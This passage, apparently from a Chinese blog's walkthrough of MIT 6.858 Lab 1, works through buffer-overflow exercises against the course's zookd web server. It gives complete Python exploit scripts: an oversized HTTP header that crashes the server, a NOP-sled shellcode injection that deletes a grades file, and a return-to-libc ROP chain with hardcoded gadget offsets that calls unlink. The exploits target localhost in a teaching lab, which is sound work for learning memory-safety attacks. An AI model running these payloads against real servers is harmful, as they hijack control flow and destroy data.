class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么下面我们来到 Exercise2，写一个 exp 来让 zookd 程序 crash 掉：</p><blockquote><p><strong>Exercise 2.</strong> Write an exploit that uses a buffer overflow to crash the web server (or one of the processes it creates). You do not need to inject code at this point. Verify that your exploit crashes the server by checking the last few lines of <code>dmesg | tail</code>, using <code>gdb</code>, or observing that the web server crashes (i.e., it will print <code>Child process 9999 terminated incorrectly, receiving signal 11</code>)</p><p>Provide the code for the exploit in a file called <code>exploit-2.py</code>.</p><p>The vulnerability you found in Exercise 1 may be too hard to exploit. Feel free to find and exploit a different vulnerability.</p></blockquote><p>我们现在来测试一下这个漏洞，首先编写一个正常的 HTTP Get 请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">host, port</span>):<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((host, <span class="hljs-built_in">int</span>(port)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: &#123;&#125; host port&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">0</span>]))<br>        exit(-<span class="hljs-number">1</span>)<br>    exp(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>])<br></code></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://s2.loli.net/2022/11/29/PujgG7EJVMmOiz1.png" alt="image.png"></p><p>接下来我们尝试利用 <code>envvar</code> 进行溢出测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> * <span class="hljs-number">512</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>可以看到 zookd 提示了子进程收到了 <code>signal 11</code>（也就是 <code>SIGSEGV</code>），同时我们收到的响应也为空字符串，说明我们成功触发了这个漏洞</p><p><img src="https://s2.loli.net/2022/12/03/oWwStCVeFG5Qd6Z.png" alt="image.png"></p><blockquote><p>MIT 其实还贴心地提供了一个 <code>exploit-template.py</code> 文件，让笔者这种不怎么会用 socket 写裸 HTTP 请求的菜鸡可以参考（笑），<del>他真的👴哭死</del></p></blockquote><p>将文件名改成 <code>exploit-2.py</code> 后我们可以使用如下命令进行评测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-crash</span><br></code></pre></td></tr></table></figure><p>评测的原理是检查 <code>/tmp/strace.log</code> 当中是否有 <code>SIGSEGV</code> 字符串，笔者也不知道为什么反正笔者电脑上没有这个文件，所以这里就跳过了（<del>👴的评价是🔈↑↓</del>）</p><blockquote><p>但是比较 SB 的是评测用的是 MIT 编译的 zookd 而不是我们自行编译的，然后他就会给👴报这种SB错误：</p><p><img src="https://s2.loli.net/2022/11/29/Fs1Ka4xTNtWXPrq.png" alt="image.png"></p><p>然后👴自己再重新试着跑 zookd 会发现，<del>因为👴的学生🐓是老旧的 Ubuntu20，👴的评价是🔈↑↓</del>：</p><p><img src="https://s2.loli.net/2022/11/29/uBRnHQ4lMjfwLrU.png" alt="image.png"></p><p>最后笔者的解决方案是拉了一个 Ubuntu 22.04 的容器在里面做…</p></blockquote><h2 id="Part-2-Code-injection"><a href="#Part-2-Code-injection" class="headerlink" title="Part 2: Code injection"></a>Part 2: Code injection</h2><p>这一部分主要是让我们进行代码注入来删掉服务器上的 <code>/home/student/grades.txt</code> 文件（自己创一个就行），要求我们使用栈具有可执行权限的 <code>zookd-exstack</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-exstack 8080</span><br></code></pre></td></tr></table></figure><p>实验还为我们提供了一份 shellcode 模板 <code>shellcode.S</code>，当我们 <code>make</code> 的时候其会被编译成 <code>shellcode.bin</code>，我们可以使用 <code>run-shellcode</code> 来验证其功能性：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./run-shellcode shellcode.bin</span><br></code></pre></td></tr></table></figure><p>接下来是 Exercise3，修改 shellcode 使其能删除  <code>/home/student/grades.txt</code>：</p><blockquote><p><strong>Exercise 3 (warm-up).</strong> Modify <code>shellcode.S</code> to unlink <code>/home/student/grades.txt</code>. Your assembly code can either invoke the <code>SYS_unlink</code> system call, or call the <code>unlink()</code> library function.</p></blockquote><p>里边是<del>丑陋的</del> AT&amp;T 汇编，笔者选择直接重写一份：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl main<br>.typemain, @function<br><br> main:<br>/* store the string on the stack */<br>xorq  %rax, %rax<br>pushq %rax<br>movq  $0x7478742e73656461, %rax /* &quot;ades.txt&quot; */<br>pushq %rax<br>movq  $0x72672f746e656475, %rax /* &quot;udent/gr&quot; */<br>pushq %rax<br>movq  $0x74732f656d6f682f, %rax /* &quot;/home/st&quot; */<br>pushq %rax<br><br>/* unlink(rsp) */<br>pushq %rsp<br>popq  %rdi<br>movq  $87, %rax /* SYS_unlink */<br>syscall<br><br>/* exit() */<br>xorq  %rdi, %rdi<br>movq  $60, %rax/* SYS_exit */<br>syscall<br><br></code></pre></td></tr></table></figure><p>成功删除文件：</p><p><img src="https://s2.loli.net/2022/12/03/FX8UsCbyW72fOtw.png" alt="image.png"></p><p>之后实验文件提示我们可以使用 strace 来跟踪 zookd 所使用的系统调用（需要root）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">strace -f -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p>比如说笔者先起一个 zookd 再运行 strace，之后用前面的 exp 打一下 zookd 就可以看到：</p><p><img src="https://s2.loli.net/2022/12/03/oKDm5yIjCin6OpG.png" alt="image.png"></p><p>前面的评测应该是基于这个完成的，但是笔者发现在 <code>/tmp/strace.log</code> 当中不会记录 <code>SIGSEGV</code> 字符串，<del>👴也不知道为什么所以这里就先⑧管了</del></p><p><img src="https://s2.loli.net/2022/12/03/GkpjiZWb71HyhD3.png" alt="image.png"></p><p>以及我们也可以使用 gdb 进行调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/M8HgfPEkdl2Vypi.png" alt="image.png"></p><p>之后实验手册扯了一堆怎么调试，这里就不管了，下面来看 Exercise 4，大概是让我们用 ret2shellcode 来打 zookd</p><blockquote><p><strong>Exercise 4.</strong> Starting from one of your exploits from Exercise 2, construct an exploit that hijacks the control flow of the web server and unlinks <code>/home/student/grades.txt</code>. Save this exploit in a file called <code>exploit-4.py</code>.</p><p>Verify that your exploit works; you will need to re-create <code>/home/student/grades.txt</code> after each successful exploit run.</p><p>Suggestion: first focus on obtaining control of the program counter. Sketch out the stack layout that you expect the program to have at the point when you overflow the buffer, and use <code>gdb</code> to verify that your overflow data ends up where you expect it to. Step through the execution of the function to the return instruction to make sure you can control what address the program returns to. The <code>next</code>, <code>stepi</code>, and <a href="https://visualgdb.com/gdbreference/commands/x"><code>x</code></a> commands in <code>gdb</code> should prove helpful.</p><p>Once you can reliably hijack the control flow of the program, find a suitable address that will contain the code you want to execute, and focus on placing the correct code at that address—e.g. a derivative of the provided shell code.</p></blockquote><p>因为没有开 ASLR 而且栈具有可执行权限，那么笔者直接用 <code>nop</code> 作为 slide code 并在栈上靠后的位置布置 shellcode 即可，这里注意别忘了把 shellcode 当中的 <code>\x00</code> 编码成 <code>%00</code> 否则会被过滤掉</p><blockquote><p>编写 shellcode 是 pwn 手最基础的技能，如果你不会的话……  ：）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode_text = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* push string */</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x7478742e73656461</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x72672f746e656475</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x74732f656d6f682f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* print the string */</span><br><span class="hljs-string">    mov rdx, 25</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* remove the file */</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rax, 87</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* exit normally */</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov rax, 60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    shellcode = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * <span class="hljs-number">4096</span> + asm(shellcode_text)<br>    payload = (p64(<span class="hljs-number">0x7fffffffe000</span>) * <span class="hljs-number">128</span> + shellcode).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(req)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>笔者编写的 shellcode 当中有 <code>exit(0)</code> 所以不会报 SIGSEGV，但是有个打印字符串的操作让我们可以直观地看到代码执行成功，如果你想看 SIGSEGV 也可以把最后的 exit 代码去掉：）</p><p><img src="https://s2.loli.net/2022/12/03/2BrKMLp4vlESICT.png" alt="image.png"></p><p>使用如下命令进行测评：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-exstack</span><br></code></pre></td></tr></table></figure><p>通过</p><p><img src="https://s2.loli.net/2022/12/03/AkztJ2qahmWZuOo.png" alt="image.png"></p><h2 id="Part-3-Return-to-libc-attacks"><a href="#Part-3-Return-to-libc-attacks" class="headerlink" title="Part 3: Return-to-libc attacks"></a>Part 3: Return-to-libc attacks</h2><p>接下来终于到了<del>大一小朋友都会的</del> ret2libc 攻击的部分，这一次我们需要使用栈不具有可执行权限的 <code>zookd-nxstack</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-nxstack 8080</span><br></code></pre></td></tr></table></figure><p><strong>返回导向编程</strong>（return-oriented programming， <strong>ROP</strong>）是用来突破包括 ASLR、栈不可执行保护在内的最为经典的攻击手法，<del>你要是不会👴也⑧教你，自己学去</del>，<code>ret2libc</code> 指的则是利用 libc 中的 gadget 来完成 ROP chain 的构建</p><p>实验手册中间的一堆介绍和说明直接跳了，<del>没啥意思</del>，接下来我们大踏步进入 Exercise 5：用 <code>ret2libc</code> 这一攻击手法来完成对 zookd 的攻击</p><blockquote><p><strong>Exercise 5.</strong> Starting from your exploit in Exercises 2 and 4, construct an exploit that unlinks <code>/home/student/grades.txt</code> when run on the binaries that have a non-executable stack. Name this new exploit <code>exploit-5.py</code>.</p><p>In this attack you are going to take control of the server over the network <em>without injecting any code</em> into the server. You should use a return-to-libc attack where you redirect control flow to code that already existed before your attack. The outline of the attack is to perform a buffer overflow that:</p><ol><li>causes the argument to the chosen libc function to be on stack</li><li>then causes <code>accidentally</code> to run so that argument ends up in <code>%rdi</code></li><li>and then causes <code>accidentally</code> to return to the chosen libc function</li></ol><p>It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a> at (1) the point that the buffer overflows and (2) at the point that <code>accidentally</code> runs.</p></blockquote><p>首先 <code>checksec</code> ，除了 canary 以外的保护都开了…</p><p><img src="https://s2.loli.net/2022/12/03/M5TCnY6tDLNB2Fa.png" alt="image.png"></p><p>开了 PIE 比较难弄，虽然我们可以利用 partial overwrite 的方式来在 text 段的同一张页面上进行一次跳转，不过我们还不知道我们的参数到 <code>http_request_headers()</code> 栈底间的距离</p><p>信息泄露这一步比较难弄，于是笔者看了看其他人的做法，发现**大家都是直接用 gdb 看程序以及 libc 的基址…**（<del>👴寻思这①丶也⑧实战啊，</del>估计是为了教学目的降低了难度）</p><blockquote><p>笔者想了大半天怎么构建 ROP、怎么泄露 libc 地址、逆了半天程序找可用的 gadget，最后才知道这个实验是直接用 gdb 查看程序代码段+libc 的地址…<del>挺无语的其实</del></p></blockquote><p>那笔者只好也这么做了（笑），虽然说他提供了一个莫名其妙的 <code>accidentially()</code> 函数但是笔者选择直接忽略，随便找程序中的一个 <code>ret</code> 构造滑板后面跟 ROP 链即可，因为这个 Exercise 说实话做起来莫名其妙的所以笔者也用莫名其妙的解法好了（笑），这里配合 ROPgadget 找了一些 gadget 随便凑了一个可用的 ROP chain：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>    <br>    func_malloc = libc_base + libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br><br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br><br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br><br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br><br>    <span class="hljs-keyword">return</span> req<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br>    sock.send(get_malicious_request())<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>笔者的解法简单来说是用 malloc 来分配一个 chunk 往上面写字符串，之后 <code>unlink(chunk)</code> 即可</p><p><img src="https://s2.loli.net/2022/12/04/O5euynk9jE3GoH7.png" alt="image.png"></p><p>使用如下命令进行检查：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-libc</span><br></code></pre></td></tr></table></figure><p>通过√</p><p><img src="https://s2.loli.net/2022/12/04/ElDbUBFJ3rqatNW.png" alt="image.png"></p><p>然后是一个 <em>Challenge</em> ，<strong>在不依赖 <code>accidentally()</code> 函数的情况下构造 ROP</strong>，提示了我们可以使用 ROPgadget 来寻找 gadget ：</p><blockquote><p><em>Challenge! (optional)</em> The <code>accidentally</code> function is a bit artificial. For extra credit, figure out how to perform the return-to-libc attack without relying on that function (delete it and find another way to make your exploit work). Provide your attack in <code>exploit-challenge.py</code>. Also, briefly explain the attack and provide ROP gadgets you use in <code>answers.txt</code>.</p><p>You will need to find another chunk of code to reuse that gives you control over <code>%rdi</code>. You can read through the disassembly (e.g. using <code>objdump</code>) to look for useful ROP gadgets.</p><p>Because of the nature of x86&#x2F;x86-64, you can use another technique to find sequences of instructions that don’t even appear in the disassembly! Instructions are variable-length (from 1 to 15 bytes), and by causing a misaligned parse (by jumping into the middle of an intended instruction), you can cause a sequence of machine code to be misinterpreted. For example, the instruction sequence <code>pop %r15; ret</code> corresponds to the machine code <code>41 5F C3</code>. But instead of executing from the start of this instruction stream, if you jump 1 byte in, the machine code <code>5F C3</code> corresponds to the assembly <code>pop %rdi; ret</code>.</p><p>Automated tools such as <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget.py</a> can assist you in searching for ROP gadgets, even finding gadgets that arise from misaligned parses. The 6.858 VM already has <code>ROPgadget</code> installed.</p><p>You may find it useful to search for ROP gadgets 